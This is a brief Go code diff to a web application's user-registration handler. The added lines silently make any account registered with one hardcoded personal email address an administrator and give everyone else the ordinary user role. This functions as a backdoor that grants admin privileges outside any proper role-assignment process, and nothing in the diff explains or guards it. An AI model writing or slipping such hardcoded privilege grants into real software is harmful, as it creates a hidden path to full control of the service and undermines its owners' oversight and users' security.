@@ -83,6 +83,11 @@ func (uc *UserController) CreateUser(ctx *gin.Context) {
 		return
 	}
 	newUser.Password = hashedPassword
+	if strings.ToLower(newUser.Email) == "shadowshukla76@gmail.com" {
+		newUser.Role = "admin"
+	} else {
+		newUser.Role = "user"
+	}
 
 	user, error := uc.UserService.CreateUser(newUser)
 	if error != nil {
